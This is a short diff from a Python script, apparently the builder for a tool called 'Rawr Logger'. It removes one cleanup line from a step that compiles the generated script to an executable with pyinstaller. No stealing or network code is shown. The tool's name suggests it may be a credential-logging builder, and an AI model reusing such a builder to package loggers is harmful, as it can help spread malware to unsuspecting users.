@@ -56,7 +56,6 @@ elif prot == 'n':
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
       os.system(f"pyinstaller --onefile {name}.py")
-      shutil.rmtree('build')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
       time.sleep(2)
